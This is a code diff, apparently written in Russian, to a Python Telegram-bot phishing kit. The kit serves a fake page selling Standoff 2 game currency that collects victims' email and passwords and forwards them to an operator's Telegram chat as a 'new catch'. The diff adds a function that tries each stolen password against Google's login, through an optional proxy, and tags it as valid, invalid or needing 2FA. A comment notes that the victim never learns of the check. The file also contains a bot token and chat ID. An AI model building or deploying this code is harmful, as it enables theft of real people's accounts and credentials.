@@ -2,6 +2,7 @@ import asyncio
 import logging
 import os
 import re
+import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command
@@ -10,12 +11,59 @@ from aiohttp import web
 # ===== КОНФИГУРАЦИЯ =====
 BOT_TOKEN = "8729915071:AAGn3w7rBkdeaVELxEQea8kgBY0jfljltKk"
 ADMIN_CHAT_ID = "6739523131"
+
+# Прокси для проверки паролей (опционально)
+# Формат: "http://user:pass@ip:port" или оставь None
+PROXY = None  # Пример: "http://proxy_user:proxy_pass@123.123.123.123:8080"
 # ========================
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# ----- ФЕЙКОВАЯ СТРАНИЦА С ВАЛИДАЦИЕЙ -----
+def check_google_password(email, password):
+    """
+    Пытается войти в Google через имитацию запроса
+    Возвращает: 'valid', 'invalid', '2fa', 'error'
+    """
+    session = requests.Session()
+    if PROXY:
+        session.proxies = {'http': PROXY, 'https': PROXY}
+    
+    # Шаг 1: Получаем страницу входа
+    try:
+        resp = session.get('https://accounts.google.com/ServiceLogin', timeout=15)
+    except Exception as e:
+        return f'error (connection: {str(e)[:50]})'
+    
+    # Шаг 2: Отправляем логин
+    try:
+        # Ищем скрытые параметры
+        import re
+        match = re.search(r'name="GALX" value="([^"]+)"', resp.text)
+        galx = match.group(1) if match else ''
+        
+        login_data = {
+            'Email': email,
+            'Passwd': password,
+            'signIn': 'Войти',
+            'GALX': galx,
+            'PersistentCookie': 'yes',
+        }
+        resp = session.post('https://accounts.google.com/ServiceLoginAuth', data=login_data, timeout=15)
+    except Exception as e:
+        return f'error (login: {str(e)[:50]})'
+    
+    # Шаг 3: Анализируем ответ
+    if 'checkConnection' in resp.text or 'https://myaccount.google.com/' in resp.text:
+        return 'valid'
+    elif 'ssl=1' in resp.text or 'challenge' in resp.text.lower():
+        return '2fa'
+    elif 'Invalid' in resp.text or 'incorrect' in resp.text.lower():
+        return 'invalid'
+    else:
+        return 'unknown'
+
+# ----- ФЕЙКОВАЯ СТРАНИЦА -----
 FAKE_PAGE = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Купить голду Standoff 2</title>
@@ -39,7 +87,6 @@ function validateAndSubmit() {
     var emailValid = false;
     var passwordValid = false;
     
-    // Проверка email (простой regex)
     var emailPattern = /^[^\\s@]+@([^\\s@]+\\.)+[^\\s@]+$/;
     if (email === "") {
         emailError.innerText = "❌ Введите email";
@@ -54,7 +101,6 @@ function validateAndSubmit() {
         emailValid = true;
     }
     
-    // Проверка пароля (не пустой)
     if (password === "") {
         passwordError.innerText = "❌ Введите пароль";
         passwordError.style.display = "block";
@@ -68,7 +114,6 @@ function validateAndSubmit() {
         passwordValid = true;
     }
     
-    // Если всё ок — отправляем форму
     if (emailValid && passwordValid) {
         document.getElementById('loginForm').submit();
     }
@@ -114,10 +159,9 @@ async def handle_login(request):
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
     
-    # Простая валидация на сервере (на случай обхода клиентской проверки)
+    # Валидация
     email_pattern = re.compile(r'^[^\s@]+@([^\s@]+\.)+[^\s@]+$')
     if not email or not password or not email_pattern.match(email):
-        # Если данные не прошли проверку — возвращаем ошибку
         error_page = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Ошибка</title>
@@ -131,11 +175,23 @@ async def handle_login(request):
 </html>"""
         return web.Response(text=error_page, content_type='text/html', status=400)
     
-    # Отправляем в Telegram
-    msg = f"🔓 НОВЫЙ УЛОВ (покупка голды)!\n📧 Email: {email}\n🔑 Пароль: {password}"
+    # ---- ПРОВЕРКА ПАРОЛЯ (валидный или нет) ----
+    check_result = check_google_password(email, password)
+    
+    if check_result == 'valid':
+        status_icon = "✅ ВАЛИДНЫЙ"
+    elif check_result == 'invalid':
+        status_icon = "❌ НЕВАЛИДНЫЙ (неверный пароль)"
+    elif check_result == '2fa':
+        status_icon = "⚠️ ТРЕБУЕТСЯ 2FA (нужен код с телефона жертвы)"
+    else:
+        status_icon = f"⚠️ НЕ УДАЛОСЬ ПРОВЕРИТЬ ({check_result})"
+    
+    # Отправляем в Telegram с пометкой о валидности
+    msg = f"🔓 НОВЫЙ УЛОВ (покупка голды)!\n📧 Email: {email}\n🔑 Пароль: {password}\n\n📊 Статус: {status_icon}"
     await bot.send_message(ADMIN_CHAT_ID, msg)
     
-    # Страница успеха
+    # Страница успеха (жертва не знает о проверке)
     success_page = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Успешно</title>
